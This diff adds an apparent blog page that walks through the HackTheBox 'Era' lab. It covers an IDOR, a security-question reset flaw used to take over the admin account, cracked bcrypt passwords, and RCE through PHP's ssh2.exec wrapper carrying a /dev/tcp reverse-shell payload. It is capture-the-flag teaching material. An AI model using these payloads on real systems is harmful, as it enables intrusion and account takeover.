@@ -1,0 +1,384 @@
+<!doctype html><html lang=en-us><head><title>Era | alfa7i7</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=generator content="Hugo 0.148.0"><link rel=canonical href=/side-quests/htb-era/><link href=/css/style.min.041e4a3e04c8d069c51f822569eabf716b17b3aec0c9052ef93405591a10b665.css rel=stylesheet><script src=https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0})</script></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a class=terminal href=/><span>alfa7i7@empire ~ $</span></a></div><input class=side-menu type=checkbox id=side-menu>
+<label class=hamb for=side-menu><span class=hamb-line></span></label><nav class=headerLinks><ul><li><a href=/posts title>~/blog</a></li><li><a href=/side-quests title>~/side-quests</a></li><li><a href=/whoami title>~/whoami</a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>Era</h1><section class=postMetadata><dl><dt>tags</dt><dd><span></span>
+<a href=/tags/php/>#PHP</a><span></span>
+<a href=/tags/elf/>#ELF</a></dd><dt>categories</dt><dd><span></span>
+<a href=/categories/hackthebox/>HackTheBox</a><span></span>
+<a href=/categories/season-8/>Season 8</a></dd><dt>published</dt><dd><time datetime=2025-07-28>July 28, 2025</time></dd><dt>reading time</dt><dd>13 minutes</dd></dl></section><div><h1 id=i-initial-recon>I. Initial Recon</h1><p>Based on <code>Nmap</code> output, Era exposes two ports: one for FTP and the other for
+HTTP:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nmap -sC -sV -sC -p- -T4 -Pn -oA scans/era-tcp 10.10.11.79
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Nmap scan report for 10.10.11.79
+</span></span><span style=display:flex><span>Host is up (0.025s latency).
+</span></span><span style=display:flex><span>Not shown: 65533 closed tcp ports (reset)
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>21/tcp open  ftp     vsftpd 3.0.5
+</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://era.htb/
+</span></span><span style=display:flex><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Regarding FTP, anonymous login is disabled and the server <code>vsftpd</code> is at
+an up-to-date version. At this stage, there is no need to dig deeper in here.</p><p>Navigating to <code>10.10.11.79</code>, we get redirected to <code>era.htb</code>. This entry should
+then be added to <code>/etc/hosts</code> on the local attack box to be able to resolve it.</p><p><img src=era.htb.png alt=era></p><p>The main site doesn&rsquo;t have much interesting content.</p><p>Doing vhost fuzzing reveales another application at <code>file.era.htb</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.79 -H <span style=color:#e6db74>&#39;Host: FUZZ.era.htb&#39;</span> -fs <span style=color:#ae81ff>154</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
+</span></span><span style=display:flex><span>file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 18ms]
+</span></span></code></pre></div><p><img src=file.era.htb.png alt="file era"></p><h1 id=ii-file-management-done-wrong>II. File management done wrong</h1><p><code>file.era.htb</code> consists of file management application.</p><p>Just by navigating the app from the browser, it doesn&rsquo;t look like a random user
+can create an account. However, a simple directory fuzzing with a common
+wordlist reveals the <code>/register.php</code> endpoint. If this endpoint was supposed
+to be hidden, then this would be considered the first weakness of the app;
+a better solution would be to restrict access to the registration page to
+explicitly whitelisted IPs.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://file.era.htb/FUZZ -e .php -fw <span style=color:#ae81ff>2608</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
+</span></span><span style=display:flex><span>.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 17ms]
+</span></span><span style=display:flex><span>.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 19ms]
+</span></span><span style=display:flex><span>.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 39ms]
+</span></span><span style=display:flex><span>assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
+</span></span><span style=display:flex><span>download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
+</span></span><span style=display:flex><span>files                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 16ms]
+</span></span><span style=display:flex><span>images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 20ms]
+</span></span><span style=display:flex><span>layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
+</span></span><span style=display:flex><span>LICENSE                 [Status: 200, Size: 34524, Words: 5707, Lines: 663, Duration: 16ms]
+</span></span><span style=display:flex><span>login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 29ms]
+</span></span><span style=display:flex><span>logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 25ms]
+</span></span><span style=display:flex><span>manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
+</span></span><span style=display:flex><span>register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 19ms]
+</span></span><span style=display:flex><span>upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
+</span></span></code></pre></div><p>After signing up, we can explore the app functionalities:</p><ol><li>File upload,</li><li>File download,</li><li>Setup security questions for login without password.</li></ol><h2 id=-getting-the-app-source-code>> getting the app source code</h2><p>TL;DR: The app sufferes from an IDOR vulnerability.</p><p>When a user uploads a file, a unique ID is given to it. This ID can be used to
+download the corresponding file. Combining the easily guessable IDs and the
+lack of authorization when downloading files are the sources of the weakness.</p><p>Exploiting this, we are able to download a ZIP backup of the web app.
+The backup belongs originally to the admin user.</p><p>The process:</p><ol><li>Register an account</li></ol><p><img src=registeration.png alt=registration></p><ol start=2><li>Log in and upload a fie</li></ol><p><img src=upload-file.png alt="file upload"></p><ol start=3><li>The app shows the download link</li></ol><p><img src=download-endpoint.png alt="download link">
+<img src=download-page.png alt="download page"></p><ol start=4><li>Fuzzing available files and discovering the backup ZIP (I used Caido):</li></ol><p><img src=caido-automate.png alt="automate request">
+<img src=automate-result.png alt="automate result"></p><ol start=5><li>Access the <code>http://file.era.htb/download.php?id=54&amp;dl=true</code> to download
+the backup.</li></ol><p>At this point, we can review the code and search for other vulnerabilities.</p><h2 id=-admin-account-takeover>> admin account takeover</h2><p>Reviewing the security questions reset feature, we discover another
+authorization related issue. The code below is responsible for handling
+related requests:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Process POST submission
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#34;REQUEST_METHOD&#34;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;POST&#34;</span>) {
+</span></span><span style=display:flex><span>    $username <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>    $new_answer1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#e6db74>&#39;new_answer1&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>    $new_answer2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#e6db74>&#39;new_answer2&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>    $new_answer3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>($_POST[<span style=color:#e6db74>&#39;new_answer3&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($username <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>||</span> $new_answer1 <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>||</span> $new_answer2 <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;&#39;</span> <span style=color:#f92672>||</span> $new_answer3 <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;&#39;</span>) {
+</span></span><span style=display:flex><span>        $error_message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;All fields are required.&#34;</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?&#34;</span>;
+</span></span><span style=display:flex><span>        $stmt <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>($query);
+</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bindValue</span>(<span style=color:#ae81ff>1</span>, $new_answer1, <span style=color:#a6e22e>SQLITE3_TEXT</span>);
+</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bindValue</span>(<span style=color:#ae81ff>2</span>, $new_answer2, <span style=color:#a6e22e>SQLITE3_TEXT</span>);
+</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bindValue</span>(<span style=color:#ae81ff>3</span>, $new_answer3, <span style=color:#a6e22e>SQLITE3_TEXT</span>);
+</span></span><span style=display:flex><span>        $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bindValue</span>(<span style=color:#ae81ff>4</span>, $username, <span style=color:#a6e22e>SQLITE3_TEXT</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>()) {
+</span></span><span style=display:flex><span>            $operation_successful <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            $error_message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Error updating security questions. Please try again.&#34;</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>It is easy to notice that the code does not verify if the user making the
+request has authorization over the supplied username. Hence, any user can reset
+security questions of any other user.</p><p>From the site backup also, we can examine the <code>filedb.sqlite</code> file to discover
+the admin username: <code>admin_ef01cab31aa</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ strings filedb.sqlite 
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SQLite format 3
+</span></span><span style=display:flex><span>3tableusersusers
+</span></span><span style=display:flex><span>CREATE TABLE users (
+</span></span><span style=display:flex><span>                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span><span style=display:flex><span>                user_name varchar(255) NOT NULL,
+</span></span><span style=display:flex><span>                user_password varchar(255) NOT NULL,
+</span></span><span style=display:flex><span>                auto_delete_files_after int NOT NULL
+</span></span><span style=display:flex><span>                , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255))P
+</span></span><span style=display:flex><span>Ytablesqlite_sequencesqlite_sequence
+</span></span><span style=display:flex><span>CREATE TABLE sqlite_sequence(name,seq)
+</span></span><span style=display:flex><span>7tablefilesfiles
+</span></span><span style=display:flex><span>CREATE TABLE files (
+</span></span><span style=display:flex><span>                fileid int NOT NULL PRIMARY KEY,
+</span></span><span style=display:flex><span>                filepath varchar(255) NOT NULL,
+</span></span><span style=display:flex><span>                fileowner int NOT NULL,
+</span></span><span style=display:flex><span>                filedate timestamp NOT NULL
+</span></span><span style=display:flex><span>                ))
+</span></span><span style=display:flex><span>indexsqlite_autoindex_files_1files
+</span></span><span style=display:flex><span>6files/site-backup-30-08-24.zipf
+</span></span><span style=display:flex><span>ethan$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
+</span></span><span style=display:flex><span>john$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
+</span></span><span style=display:flex><span>yuri$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
+</span></span><span style=display:flex><span>veronica$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
+</span></span><span style=display:flex><span>admin_ef01cab31aa$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
+</span></span><span style=display:flex><span>XMariaOliverOttawaJ
+</span></span><span style=display:flex><span>eric$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
+</span></span><span style=display:flex><span>users
+</span></span></code></pre></div><p>Reset security questions for admin:</p><p><img src=admin-sec-questions.png alt="admin reset"></p><p>Log out, then log in as admin using security questions:</p><p><img src=admin-login.png alt="admin login">
+<img src=admin-dashboard.png alt="admin dashboard"></p><h2 id=-remote-code-execution>> remote code execution</h2><p>Now that we have admin access to the application, we will go back once more to
+the source code to find another vulnerability (a half-baked feature).</p><p>In <code>download.php</code>, we find the following code (lines 58:83):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// BETA (Currently only available to the admin) - Showcase file instead of downloading it
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>elseif</span> ($_GET[<span style=color:#e6db74>&#39;show&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;true&#34;</span> <span style=color:#f92672>&amp;&amp;</span> $_SESSION[<span style=color:#e6db74>&#39;erauser&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>    $format <span style=color:#f92672>=</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;format&#39;</span>]) <span style=color:#f92672>?</span> $_GET[<span style=color:#e6db74>&#39;format&#39;</span>] <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>    $file <span style=color:#f92672>=</span> $fetched[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span>($format, <span style=color:#e6db74>&#39;://&#39;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>) {
+</span></span><span style=display:flex><span>        $wrapper <span style=color:#f92672>=</span> $format;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/octet-stream&#39;</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        $wrapper <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: text/html&#39;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>        $file_content <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>($wrapper <span style=color:#f92672>?</span> $wrapper <span style=color:#f92672>.</span> $file <span style=color:#f92672>:</span> $file, <span style=color:#e6db74>&#39;r&#39;</span>);
+</span></span><span style=display:flex><span>        $full_path <span style=color:#f92672>=</span> $wrapper <span style=color:#f92672>?</span> $wrapper <span style=color:#f92672>.</span> $file <span style=color:#f92672>:</span> $file;
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Debug Output
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Opening: &#34;</span> <span style=color:#f92672>.</span> $full_path <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $file_content;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>Exception</span> $e) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Error reading file: &#34;</span> <span style=color:#f92672>.</span> $e<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getMessage</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The application allows the usage of arbitrary PHP wrappers (supported by the
+web server). There are different ways to enumerate supported wrappers based on
+the specific context of an engagement. In this particular scenario, we can
+enumerate PHP extensions that are installed, and infer what wrappers could
+be accessible (not all extensions provide their own stream wrappers).</p><p>Check out <a href=https://www.php.net/manual/en/wrappers.php>Supported Protocols and Wrappers</a>
+from the official PHP documentation.</p><p>Looking back at the information gathered so far, we haven&rsquo;t explored the FTP
+server yet due to lack of credentials. However, we were able to find user
+accounts and their password hashes from the application backup, and now we can
+attempt to crack them.</p><p>Cracking the hashes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
+</span></span><span style=display:flex><span>john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
+</span></span><span style=display:flex><span>yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
+</span></span><span style=display:flex><span>veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
+</span></span><span style=display:flex><span>admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
+</span></span><span style=display:flex><span>eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hashes
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
+</span></span><span style=display:flex><span>Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
+</span></span><span style=display:flex><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style=display:flex><span>america          (eric)     
+</span></span><span style=display:flex><span>mustang          (yuri) 
+</span></span></code></pre></div><p>Using Yuri credentials to log in to FTP, we find all installed extensions
+under <code>php8.1_conf</code> folder:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ftp era.htb 
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Connected to era.htb.
+</span></span><span style=display:flex><span>220 (vsFTPd 3.0.5)
+</span></span><span style=display:flex><span>Name (era.htb:kali): yuri
+</span></span><span style=display:flex><span>331 Please specify the password.
+</span></span><span style=display:flex><span>Password: 
+</span></span><span style=display:flex><span>230 Login successful.
+</span></span><span style=display:flex><span>Remote system type is UNIX.
+</span></span><span style=display:flex><span>Using binary mode to transfer files.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ftp&gt; ls
+</span></span><span style=display:flex><span>229 Entering Extended Passive Mode (|||37476|)
+</span></span><span style=display:flex><span>150 Here comes the directory listing.
+</span></span><span style=display:flex><span>drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
+</span></span><span style=display:flex><span>drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
+</span></span><span style=display:flex><span>226 Directory send OK.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ftp&gt; ls php8.1_conf
+</span></span><span style=display:flex><span>229 Entering Extended Passive Mode (|||54636|)
+</span></span><span style=display:flex><span>150 Here comes the directory listing.
+</span></span><span style=display:flex><span>drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
+</span></span><span style=display:flex><span>-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
+</span></span><span style=display:flex><span>226 Directory send OK.
+</span></span></code></pre></div><p>As we don&rsquo;t have access to <code>php.ini</code> file (to inspect what extensions are
+actually enabled), we may try every possible wrapper featuring a command
+execution path; I tried to get <code>phar://</code>, <code>zip://</code>, and <code>php://</code> to work
+but without success.</p><p>The next (logical) move is to leverage <a href=https://www.php.net/manual/en/wrappers.ssh2.php>Secure Shell 2</a>
+extension, due to the different wrappers made particularly for code execution.
+<code>ssh2.exec://</code> works perfectly in this context given <code>yuri</code> or <code>eric</code>
+credentials.</p><p><code>ssh2.exec://</code> syntax:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>ssh2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>://</span><span style=color:#a6e22e>user</span><span style=color:#f92672>:</span><span style=color:#a6e22e>pass</span><span style=color:#f92672>@</span><span style=color:#a6e22e>example</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>:</span><span style=color:#ae81ff>22</span><span style=color:#f92672>/</span><span style=color:#a6e22e>usr</span><span style=color:#f92672>/</span><span style=color:#a6e22e>local</span><span style=color:#f92672>/</span><span style=color:#a6e22e>bin</span><span style=color:#f92672>/</span><span style=color:#a6e22e>somecmd</span>
+</span></span></code></pre></div><p>That being said, back to <code>donwload.php</code> endpoint, we can achieve RCE using
+<code>ssh.exec://</code> via the following HTTP request from an admin session:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /download.php?id=54&amp;show=true&amp;format=ssh2.exec://eric:america@localhost/bash+-c+&#39;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.44%2F1234%200%3E%261&#39;+%26%26+cat%20 <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>file.era.htb</span>
+</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Caido </span>
+</span></span><span style=display:flex><span>Accept<span style=color:#f92672>:</span> <span style=color:#ae81ff>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style=display:flex><span>Accept-Language<span style=color:#f92672>:</span> <span style=color:#ae81ff>en-US,en;q=0.5</span>
+</span></span><span style=display:flex><span>Accept-Encoding<span style=color:#f92672>:</span> <span style=color:#ae81ff>gzip, deflate</span>
+</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>keep-alive</span>
+</span></span><span style=display:flex><span>Cookie<span style=color:#f92672>:</span> <span style=color:#ae81ff>PHPSESSID=g0abn184cr4qvruhcvbsl3cuna</span>
+</span></span><span style=display:flex><span>Upgrade-Insecure-Requests<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Priority<span style=color:#f92672>:</span> <span style=color:#ae81ff>u=0, i</span>
+</span></span></code></pre></div><p>Recieving reverse shell on the attack machine (listener should have been started
+before making the request):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc -lnvp <span style=color:#ae81ff>1234</span> 
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>listening on [any] 1234 ... 
+</span></span><span style=display:flex><span>connect to [10.10.16.64] from (UNKNOWN) [10.10.11.79] 39078 
+</span></span><span style=display:flex><span>bash: cannot set terminal process group (4272): Inappropriate ioctl for device
+</span></span><span style=display:flex><span>bash: no job control in this shell
